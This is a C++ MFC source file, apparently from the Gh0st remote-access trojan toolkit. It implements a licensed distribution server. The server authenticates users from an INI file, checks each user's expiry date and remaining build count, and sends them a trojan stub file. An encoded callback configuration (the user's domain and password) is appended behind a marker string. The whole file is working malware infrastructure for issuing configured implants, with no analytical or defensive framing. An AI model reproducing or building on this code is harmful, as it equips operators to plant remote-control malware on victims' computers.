// Gh0stServerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Gh0stServer.h"
#include "Gh0stServerDlg.h"
#include "COMMON.h"
#include "encode.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
    CAboutDlg();

    // Dialog Data
    //{{AFX_DATA(CAboutDlg)
    enum { IDD = IDD_ABOUTBOX };
    //}}AFX_DATA

    // ClassWizard generated virtual function overrides
    //{{AFX_VIRTUAL(CAboutDlg)
protected:
    virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
    //}}AFX_VIRTUAL

    // Implementation
protected:
    //{{AFX_MSG(CAboutDlg)
    //}}AFX_MSG
    DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
    //{{AFX_DATA_INIT(CAboutDlg)
    //}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);
    //{{AFX_DATA_MAP(CAboutDlg)
    //}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
    //{{AFX_MSG_MAP(CAboutDlg)
    // No message handlers
    //}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGh0stServerDlg dialog

CGh0stServerDlg::CGh0stServerDlg(CWnd* pParent /*=NULL*/)
    : CDialog(CGh0stServerDlg::IDD, pParent)
{
    //{{AFX_DATA_INIT(CGh0stServerDlg)
    m_port = 0;
    //}}AFX_DATA_INIT
    // Note that LoadIcon does not require a subsequent DestroyIcon in Win32
    m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
    m_port = 8813;
    GetCurrentDirectoryA(sizeof(DAT_PATH), DAT_PATH);
    lstrcpyA(INI_PATH, DAT_PATH);
    lstrcatA(DAT_PATH, "\\");
    lstrcatA(INI_PATH, "\\");
    lstrcatA(DAT_PATH, DAT_NAME);
    lstrcatA(INI_PATH, INI_NAME);
}

void CGh0stServerDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);
    //{{AFX_DATA_MAP(CGh0stServerDlg)
    DDX_Text(pDX, IDC_EDIT1, m_port);
    DDV_MinMaxInt(pDX, m_port, 1, 65535);
    //}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CGh0stServerDlg, CDialog)
    //{{AFX_MSG_MAP(CGh0stServerDlg)
    ON_WM_SYSCOMMAND()
    ON_WM_PAINT()
    ON_WM_QUERYDRAGICON()
    ON_BN_CLICKED(IDC_START, OnStart)
    ON_BN_CLICKED(IDC_EXIT, OnExit)
    //}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGh0stServerDlg message handlers

BOOL CGh0stServerDlg::OnInitDialog()
{
    CDialog::OnInitDialog();

    // Add "About..." menu item to system menu.

    // IDM_ABOUTBOX must be in the system command range.
    ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
    ASSERT(IDM_ABOUTBOX < 0xF000);

    CMenu* pSysMenu = GetSystemMenu(FALSE);
    if (pSysMenu != NULL)
    {
        CString strAboutMenu;
        strAboutMenu.LoadString(IDS_ABOUTBOX);
        if (!strAboutMenu.IsEmpty())
        {
            pSysMenu->AppendMenu(MF_SEPARATOR);
            pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
        }
    }

    // Set the icon for this dialog.  The framework does this automatically
    //  when the application's main window is not a dialog
    SetIcon(m_hIcon, TRUE);			// Set big icon
    SetIcon(m_hIcon, FALSE);		// Set small icon

    // TODO: Add extra initialization here

    return TRUE;  // return TRUE  unless you set the focus to a control
}

void CGh0stServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
    if ((nID & 0xFFF0) == IDM_ABOUTBOX)
    {
        CAboutDlg dlgAbout;
        dlgAbout.DoModal();
    }
    else
    {
        CDialog::OnSysCommand(nID, lParam);
    }
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CGh0stServerDlg::OnPaint()
{
    if (IsIconic())
    {
        CPaintDC dc(this); // device context for painting

        SendMessage(WM_ICONERASEBKGND, (WPARAM)dc.GetSafeHdc(), 0);

        // Center icon in client rectangle
        int cxIcon = GetSystemMetrics(SM_CXICON);
        int cyIcon = GetSystemMetrics(SM_CYICON);
        CRect rect;
        GetClientRect(&rect);
        int x = (rect.Width() - cxIcon + 1) / 2;
        int y = (rect.Height() - cyIcon + 1) / 2;

        // Draw the icon
        dc.DrawIcon(x, y, m_hIcon);
    }
    else
    {
        CDialog::OnPaint();
    }
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CGh0stServerDlg::OnQueryDragIcon()
{
    return (HCURSOR)m_hIcon;
}

void My_GetTime(char Rstr[])
{
    time_t curtime = time(0);
    tm tim = *localtime(&curtime);
    int day, mon, year, hour, minute, seconds;
    day = tim.tm_mday;
    mon = tim.tm_mon;
    year = tim.tm_year;
    hour = tim.tm_hour;
    minute = tim.tm_min;
    seconds = tim.tm_sec;

    year += 1900;
    mon += 1;
    sprintf(Rstr, "%04d%02d%02d", year, mon, day);
}

void SendFile(SOCKET sock, char *username, char *ConnPass)//SOCKET,服务的配置信息,用户名
{
    char Buffer[128] = { 0 };

    HANDLE hFile = CreateFileA(DAT_PATH, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        AfxMessageBox(_T("DAT文件不存在!"));
        return;
    }

    //验证使用次数
    char read_build[256];
    char new_build[256];
    memset(read_build, 0, sizeof(read_build));
    GetPrivateProfileStringA(username, "build", NULL, read_build, sizeof(read_build), INI_PATH);
    if (atoi(read_build) <= 0)
    {
        CloseHandle(hFile);
        return;
    }

    //得到域名及其端口信息
    char read_dns[256] = { 0 };
    memset(read_dns, 0, sizeof(read_dns));
    GetPrivateProfileStringA(username, "DNS", NULL, read_dns, sizeof(read_dns), INI_PATH);
    if (lstrlenA(read_dns) == 0)
    {
        CloseHandle(hFile);
        return;//获取错误，直接返回
    }

    ConnPass++;
    if (lstrlenA(ConnPass) != 0)
    {
        lstrcatA(read_dns, "|");
        lstrcatA(read_dns, ConnPass);
    }

    //然后加密信息
    char *Config_INFO = MyEncode(read_dns);
    char finally_info[256] = "WCCCRX";//6个A，上线时查找
    lstrcatA(finally_info, Config_INFO);
    delete Config_INFO;
    static int i = 1;
    NET_DATA MyData;
    while (1)
    {
        memset(&MyData, 0, sizeof(NET_DATA));
        MyData.Flags = File_Buffer;
        ReadFile(hFile, MyData.Buffer, 1024, &MyData.Buffer_Size, NULL);
        if (MyData.Buffer_Size == 0)//读取完了，文件发送完成，继续发送配置信息,并且使用次数减1
        {
            CloseHandle(hFile);
            memset(new_build, 0, sizeof(new_build));
            wsprintfA(new_build, "%d", atoi(read_build) - 1);
            WritePrivateProfileStringA(username, "build", new_build, INI_PATH);
            memset(&MyData, 0, sizeof(NET_DATA));
            MyData.Flags = File_Buffer_Finish;
            lstrcpyA((char*)&MyData.Buffer, finally_info);
            MyData.Buffer_Size = lstrlenA(finally_info) + 1;
            if (send(sock, (char*)&MyData, sizeof(MyData), NULL) == SOCKET_ERROR) break;
            recv(sock, Buffer, sizeof(Buffer), NULL);
            break;
        }
        if (send(sock, (char*)&MyData, sizeof(MyData), NULL) == SOCKET_ERROR) break;
        recv(sock, Buffer, sizeof(Buffer), NULL);

        i++;
    }
    //CloseHandle(hFile);

    return;
}

BOOL CheckUser(char *buff, char *username)
{
    /*
    Login:用户名@密码
    */
    char read_pass[256];
    char read_date[256];
    char bendi_date[256];
    if (strncmp(buff, "Login:", 6) == 0)//如果前面几个验证字符相等
    {
        char *pos1 = strchr(buff, ':');//查找字符串s中首次出现字符c的位置
        pos1++;		 //pos1为 用户名@密码
        char *pos2 = strchr(pos1, '@');
        *pos2 = '\0';
        pos2++;					//pos2为密码
        memset(read_pass, 0, sizeof(read_pass));
        /************************************************************************/
        /*
        　函数返回值为string的长度(long型),而从ini文件获得的字符串则保留在目的缓冲器中
         DWORD GetPrivateProfileString
         (
         　LPCTSTR lpAppName, //配置文件的section名
          　LPCTSTR lpKeyName, //配置文件的key名
           　LPCTSTR lpDefault,// 如果INI文件中没有前两个参数指定的字段名或键名,则将此值赋给变量.
            LPTSTR lpReturnedString,// 接收INI文件中的值的CString对象,即目的缓存器.
            DWORD nSize,//目的缓存器的大小.
            LPCTSTR lpFileName  //是完整的INI文件名
            );
            */
        /************************************************************************/
        GetPrivateProfileStringA(pos1, "USERPASS", NULL, read_pass, sizeof(read_pass), INI_PATH);//GetPrivateProfileString意思是为初始化文件中指定的条目取得字串 
        if (lstrcmpiA(pos2, read_pass) == 0)//完全相等，忽略大小写  密码验证
        {
            //验证使用时间是否到期
            memset(read_date, 0, sizeof(read_date));
            GetPrivateProfileStringA(pos1, "date", NULL, read_date, sizeof(read_date), INI_PATH);
            My_GetTime(bendi_date);
            if (atoi(bendi_date) > atoi(read_date)) return FALSE;
            lstrcpyA(username, pos1);
            return TRUE;
        }
        else
        {
            return FALSE;
        }
    }
    else//连验证字符都不相等，直接PASS
    {
        return FALSE;
    }
}

/*
多线程处理事件
*/
DWORD WINAPI AnswerThread(LPVOID lparam)
{
    SOCKET ClientSocket = (SOCKET)lparam;
    char Buffer[1024] = { 0 };
    char UserName[30] = { 0 };
    int Ret = 0;
    BOOL isLogined = FALSE;
    char *strYes = "Logined";
    char *strNO = "Wrong";

    while (1)
    {
        memset(Buffer, 0, sizeof(Buffer));
        Ret = recv(ClientSocket, Buffer, sizeof(Buffer), NULL);
        if (Ret == 0 || Ret == SOCKET_ERROR)
        {
            break;
        }

        if (!isLogined)//没有登录
        {
            if (CheckUser(Buffer, UserName))
            {
                isLogined = TRUE;
                send(ClientSocket, strYes, lstrlenA(strYes) + 1, NULL);//发送字符，告诉客户端已经通过验证
                continue;
            }
            else//没有登录还不登录的，直接断开
            {
                break;
            }
        }
        else//已经登录
        {
            if (Buffer[0] == Request_DOWN)//如果是获取配置文件
            {
                //				AfxMessageBox("发送文件");
                SendFile(ClientSocket, UserName, Buffer);//发送文件，然后断开
                break;
            }
            else//其他无用信息，直接断开连接，节省服务器资源
            {
                break;
            }
        }
    }
    closesocket(ClientSocket);
    return 0;
}

DWORD WINAPI ListenThread(LPVOID lparam)
{
    SOCKET AcceptSocket;
    DWORD dwThreadId;
    while (1)
    {
        AcceptSocket = SOCKET_ERROR;
        while (AcceptSocket == SOCKET_ERROR)
        {
            AcceptSocket = accept(g_hSocket, NULL, NULL);
        }
        CreateThread(NULL, NULL, AnswerThread, (LPVOID)AcceptSocket, 0, &dwThreadId);
    }
    WSACleanup();
    return 0;
}

void CGh0stServerDlg::OnStart()
{
    // TODO: Add your control notification handler code here
    UpdateData(TRUE);
    if (m_port <= 0 || m_port > 65535)
    {
        return;
    }

    WSADATA wsaData;
    SOCKADDR_IN m_addr;
    int iRet = 0;
    DWORD ThreadId;

    if (g_hSocket != NULL)
    {
        closesocket(g_hSocket);
    }

    WSACleanup();
    iRet = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iRet != NO_ERROR)
    {
        AfxMessageBox(_T("Error at WSAStartup()"));
        return;
    }
        
    memset(&m_addr, 0, sizeof(SOCKADDR));
    m_addr.sin_family = AF_INET;
    m_addr.sin_addr.S_un.S_addr = INADDR_ANY;
    m_addr.sin_port = htons(m_port);

    g_hSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (bind(g_hSocket, (LPSOCKADDR)&m_addr, sizeof(m_addr)) == SOCKET_ERROR)
    {
        AfxMessageBox(_T("Bind失败,端口可能被占用!"));
        WSACleanup();
        return;
    }
    if (listen(g_hSocket, 10000) == SOCKET_ERROR)
    {
        AfxMessageBox(_T("Listen失败!"));
        WSACleanup();
        return;
    }
    g_hLinstenThread = CreateThread(NULL, NULL, ListenThread, NULL, 0, &ThreadId);
    ((CEdit*)GetDlgItem(IDC_EDIT1))->EnableWindow(FALSE);
    ((CButton*)GetDlgItem(IDC_START))->EnableWindow(FALSE);	//禁用按钮
    return;
}

void CGh0stServerDlg::OnExit()
{
    // TODO: Add your control notification handler code here
    if (g_hLinstenThread != NULL)
    {
        CloseHandle(g_hLinstenThread);
    }
    if (g_hSocket != NULL)
    {
        closesocket(g_hSocket);
    }
    WSACleanup();
    //ExitProcess(0);
}
